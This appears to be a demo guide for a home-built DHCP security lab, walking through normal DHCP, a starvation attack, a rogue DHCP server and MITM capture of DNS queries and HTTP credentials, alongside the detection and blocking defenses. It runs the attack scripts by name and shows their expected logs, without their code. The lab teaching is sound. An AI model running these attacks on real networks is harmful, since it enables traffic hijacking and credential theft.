# 🎬 DHCP Security Lab — Demo Guide

Step-by-step walkthrough for running the complete demonstration.
Each phase builds on the previous one.

---

## 🧰 Pre-Demo Checklist

- [ ] Machine 1 (Kali) setup complete: `./setup_kali.sh` ran successfully
- [ ] Machine 2 (Attacker) setup complete: `./setup_attacker.sh` ran successfully
- [ ] Machine 3 (Victim) ready to connect to WiFi
- [ ] All terminals open and positioned (recommend 2 on Kali, 3 on Attacker)
- [ ] Verify `iw list` shows AP mode supported on Kali's WiFi card
- [ ] Verify `hostapd` is running: `pgrep hostapd && echo running`

---

## Phase 1 — Normal DHCP Operation

**Goal:** Show the legitimate DHCP handshake working correctly.

### Terminal 1 (Kali)
```bash
sudo python3 server.py
```

Expected output:
```
═══════════════════════════════════════════════════════════
  DHCP SERVER  (Machine 1 — Kali)
  Started: 2024-01-15 10:00:00
═══════════════════════════════════════════════════════════

2024-01-15 10:00:00  [INFO    ]  DHCP-SERVER           DHCP Server starting on wlan0 (aa:bb:cc:dd:ee:ff)
2024-01-15 10:00:00  [INFO    ]  DHCP-SERVER           Pool: 192.168.1.100 – 192.168.1.120  (21 IPs)
2024-01-15 10:00:00  [INFO    ]  DHCP-SERVER           Listening on wlan0  (port 67/UDP) ...
```

### Machine 3 (Victim)
Connect to **DHCP-Lab** WiFi.

### Watch on Kali Terminal 1:
```
[INFO    ]  DHCP-SERVER    [OFFER] aa:bb:cc:11:22:33 → 192.168.1.100
[INFO    ]  DHCP-SERVER    [ACK]   aa:bb:cc:11:22:33 → 192.168.1.100
[INFO    ]  DHCP-SERVER    [SNOOPING] Binding added: aa:bb:cc:11:22:33 → 192.168.1.100
```

### Verify on Victim:
```bash
ip addr show wlan0
# Should show: inet 192.168.1.100/24

ping 192.168.1.1      # gateway reachable
curl http://example.com  # internet works via NAT
```

✅ **Phase 1 complete** — Legitimate DHCP working.

---

## Phase 2 — DHCP Starvation Attack + IPS Defense

**Goal:** Show the attacker exhausting the IP pool, and IPS blocking it.

### Terminal 2 (Kali — defense)
```bash
sudo python3 defense.py
```

### Terminal 1 (Attacker)
```bash
sudo python3 starvation.py -c 200 -t 0.05
```

Expected attacker output:
```
═══════════════════════════════════════════════════════════
  DHCP STARVATION ATTACK  (Machine 2 — Attacker)
  Started: 2024-01-15 10:05:00
═══════════════════════════════════════════════════════════

[WARNING ]  STARVATION     Starting starvation on interface 'wlan0' | count=200 | interval=0.05s
[INFO    ]  STARVATION     [TX] 10 packets sent | last MAC: de:ad:be:ef:01:23
[INFO    ]  STARVATION     [TX] 20 packets sent | last MAC: ca:fe:ba:be:99:88
...
[WARNING ]  STARVATION     Starvation stopped. Total packets sent: 200
```

Expected defense output on Kali:
```
[CRIT    ]  DEFENSE   [CRIT] [STARVATION] ATTACK DETECTED — 15 unique MACs in 1 second! Pool exhaustion imminent.
[WARNING ]  DEFENSE   [WARN] [STARVATION] Rate limit: MAC de:ad:be:ef:01:23 sent 5 DISCOVERs in 10s — blocking
```

Expected server output on Kali:
```
[CRITICAL]  DHCP-SERVER  [IPS] STARVATION DETECTED — 15 unique MACs/sec!
[CRITICAL]  DHCP-SERVER  [IPS] Starvation attack in progress — pool protection active
```

### Now try connecting a new victim:
If the pool is fully exhausted:
```
[ERROR   ]  DHCP-SERVER  [SERVER] Pool exhausted — cannot offer address
```

✅ **Phase 2 complete** — Starvation detected + pool protection triggered.

---

## Phase 3 — Rogue DHCP Server Attack

**Goal:** Show attacker winning the DHCP race to redirect victim traffic.

### First: release victim's current lease
On victim:
```bash
sudo dhclient -r wlan0    # release current IP
```

### Terminal 2 (Attacker)
```bash
sudo python3 rogue_dhcp.py
```

Expected:
```
═══════════════════════════════════════════════════════════
  ROGUE DHCP SERVER  (Machine 2 — Attacker)
  Started: 2024-01-15 10:10:00
═══════════════════════════════════════════════════════════

[WARNING ]  ROGUE-DHCP   Rogue DHCP Server starting on wlan0 (aa:bb:cc:dd:ee:ff)
  Rogue IP      : 192.168.1.200
  Malicious GW  : 192.168.1.200
  Malicious DNS : 192.168.1.200
  Pool          : 192.168.1.150 – 192.168.1.170
```

### Now reconnect victim to WiFi (or request new lease):
```bash
sudo dhclient wlan0
```

If rogue server wins the race, victim gets:
- IP: `192.168.1.150` (from rogue pool)
- Gateway: `192.168.1.200` (attacker's IP)

Check on victim:
```bash
ip route show
# default via 192.168.1.200  ← malicious gateway!
```

### Defense detects on Kali:
```
[CRIT    ]  DEFENSE   [CRIT] [ROGUE-DHCP] ROGUE SERVER DETECTED — IP=192.168.1.200  MAC=aa:bb:cc:dd:ee:ff  Type=OFFER
[WARNING ]  DEFENSE   [BLOCK] 192.168.1.200 — iptables rule added (ret=0)
[WARNING ]  DEFENSE   [BLOCK] MAC aa:bb:cc:dd:ee:ff on wlan0 — ebtables rule added
```

✅ **Phase 3 complete** — Rogue DHCP detected + attacker IP/MAC blocked.

---

## Phase 4 — MITM Traffic Interception

**Goal:** Show DNS queries and HTTP credentials being captured.

> Requires victim to have accepted the rogue DHCP offer (Phase 3).

### Terminal 3 (Attacker)
```bash
sudo python3 mitm_sniffer.py
```

### On victim — generate some traffic:
```bash
# DNS queries
ping -c 1 google.com
curl http://httpforever.com

# Simulate login form (HTTP only — demonstrates credential capture)
curl -X POST http://httpbin.org/post \
     -d "username=alice&password=secret123"
```

Expected sniffer output:
```
[INFO    ]  MITM-SNIFFER  [DNS   ]  192.168.1.150  queried  google.com
[INFO    ]  MITM-SNIFFER  [DNS   ]  192.168.1.150  queried  httpbin.org
[INFO    ]  MITM-SNIFFER  [HTTP  ]  192.168.1.150 → 93.184.216.34  POST /post  Host: httpbin.org
[INFO    ]  MITM-SNIFFER  [CREDS ]  CREDENTIAL FOUND  192.168.1.150 → 93.184.216.34  username = alice
[INFO    ]  MITM-SNIFFER  [CREDS ]  CREDENTIAL FOUND  192.168.1.150 → 93.184.216.34  password = secret123
```

Captured data is also written to: `/tmp/mitm_capture.log`

✅ **Phase 4 complete** — DNS + HTTP credentials intercepted.

---

## Phase 5 — Full Defense Active

**Goal:** Show the defense blocking all attacks end-to-end.

### Kali — start everything:
```bash
# Terminal 1
sudo python3 server.py

# Terminal 2
sudo python3 defense.py
```

### Attacker — run all attacks:
```bash
sudo ./run_attacker.sh
# Select option 4 (Run ALL)
```

### Watch defense terminal:

Within seconds you'll see:
```
[CRIT ] [STARVATION] ATTACK DETECTED — N unique MACs/sec!
[CRIT ] [ROGUE-DHCP] ROGUE SERVER DETECTED — IP=192.168.1.200 ...
[WARN ] [STARVATION] Rate limit: MAC xx:xx:xx:xx:xx:xx blocked
[WARN ] [BLOCK] 192.168.1.200 — iptables rule added
```

### Victim now connects:
- Gets legitimate IP `192.168.1.100–120`
- Rogue server is blocked by iptables — its packets drop silently
- Starvation flooding is rate-limited per MAC

✅ **Phase 5 complete** — Defense blocks all attack vectors simultaneously.

---

## 📊 Demo Summary

| Phase | Attack | Defense Active | Outcome |
|-------|--------|----------------|---------|
| 1 | None | IPS + Snooping | Normal DHCP works |
| 2 | Starvation | Rate limiting + pool guard | Attack blocked |
| 3 | Rogue DHCP | Snooping + iptables | Rogue server blocked |
| 4 | MITM (after rogue wins) | — (for demo) | Traffic captured |
| 5 | All attacks | All defenses | Defense wins |

---

## 🔍 Key Log Files

| File | Description |
|------|-------------|
| `/tmp/dhcp_lab.log` | Combined server + defense log |
| `/tmp/dhcp_snooping_bindings.json` | Persistent binding table |
| `/tmp/mitm_capture.log` | MITM captured traffic |

---

## 🧹 Cleanup

### On Kali:
```bash
# Stop all scripts (Ctrl+C)
pkill -f server.py
pkill -f defense.py
pkill hostapd

# Remove iptables rules
iptables -F
iptables -t nat -F

# Remove ebtables rules (if used)
ebtables -F
```

### On Attacker:
```bash
pkill -f starvation.py
pkill -f rogue_dhcp.py
pkill -f mitm_sniffer.py
```
